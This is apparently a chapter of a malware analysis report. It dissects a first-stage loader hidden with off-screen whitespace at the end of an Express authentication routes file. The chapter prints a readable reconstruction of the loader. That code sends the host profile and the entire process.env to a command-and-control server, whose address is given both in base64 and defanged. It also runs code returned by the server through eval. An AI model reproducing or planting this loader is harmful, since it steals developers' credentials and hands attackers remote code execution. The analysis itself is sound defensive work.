<!-- 🇬🇧 English (default) · 🇮🇹 Italiano: 02-stage1-loader.it.md -->

# 02 — Stage 1: the loader in `routes/api/auth.js`

## Where it hides

The payload is appended to the end of an apparently normal Express routing file. Lines 1–16 are legitimate code (login + validation). At **line 17**, after **hundreds of whitespace characters** that push the code off-screen, sits an `obfuscator.io`-style obfuscated blob (`_0x…` variables, rotated string array, hexadecimal indices). Right after it, `module.exports = router;`.

```js
router.post('/', [...], login);
                              ⟵ centinaia di spazi ⟶   (function(_0x481bac,_0xd92d3e){…MALWARE…})(…);
module.exports = router;
```

The forced indentation is an anti-review technique: in a diff or in an editor without word-wrap the line looks empty.

## What it does — deobfuscated

Readable reconstruction of the blob:

```js
const os = require('os');
let sysId = 0;

// 1) Profilazione della vittima
function getSystemInfo() {
  return {
    hostname: os.hostname(),
    macs: [ /* MAC della prima interfaccia IPv4 non interna, != 00:00:00:00:00:00 */ ],
    os: `${os.type()} ${os.release()} (${os.platform()})`,
  };
}

// 2) Beacon al C2 + esecuzione della seconda fase
async function sendRequest(sysInfo) {
  try {
    const params = new URLSearchParams({
      sysInfo:     JSON.stringify(sysInfo),
      processInfo: JSON.stringify(process.env),   // ⚠️ TUTTE le variabili d'ambiente
      tid:         'bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=', // base64 = "now it time to get everything"
      sysId:       sysId,                          // id vittima assegnato dal C2
    });

    // URL del C2 in base64 per nasconderlo
    const url = Buffer.from(
      'aHR0cDovLzIxNi4yNTAuMjUxLjE4NzoxMjI0L2FwaS9jaGVja1N0YXR1cw==',
      'base64').toString('utf8');  // → hxxp://216[.]250[.]251[.]187:1224/api/checkStatus

    const res = await fetch(url + '?' + params);
    const { status, message, sysId: newId } = await res.json();

    if (status === 'error') {              // ⚠️ trigger keyword is "error" (counter-intuitive)
      try { eval(message); } catch (e) {}   // ⚠️⚠️ RCE: executes arbitrary code from the C2
    }
    if (newId) sysId = newId;
  } catch (e) { console.error(e); }
}

// 3) Avvio immediato + ripetizione ogni 5 secondi
try {
  const s = getSystemInfo();
  sendRequest(s);
  setInterval(() => sendRequest(s), 5000);   // 0x1388 ms
} catch (e) { console.error(e); process.exit(1); }
```

## Decoded strings

| Obfuscated (base64) | Real |
|---|---|
| `aHR0cDovLzIxNi4yNTAuMjUxLjE4NzoxMjI0L2FwaS9jaGVja1N0YXR1cw==` | `hxxp://216[.]250[.]251[.]187:1224/api/checkStatus` |
| `bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=` (`tid`) | `now it time to get everything` |

The `tid` is the operator's **campaign identifier**.

## When it fires

The blob is **top-level** module code: it runs when the router is `require()`d, that is **at server startup** (`node server.js`). No one needs to call the login endpoint — just starting the app once is enough.

## Data exfiltrated in this stage

- `os.hostname()`, OS type/release/platform, MAC address;
- **the entire `process.env`** → on a development machine this typically includes `JWT_SECRET`, `MONGO_URI` (DB credentials), API tokens, cloud keys, CI/CD secrets — all **in cleartext over unencrypted HTTP**.

## Why it is effective (defense evasion)

- `obfuscator.io` obfuscation (array rotated at runtime until a checksum matches);
- URL and `tid` in base64;
- payload hidden by off-screen indentation;
- the second stage is never written to disk → little material for static AVs.

Sample isolated and *defanged*: [`samples/stage1/`](../samples/stage1/).
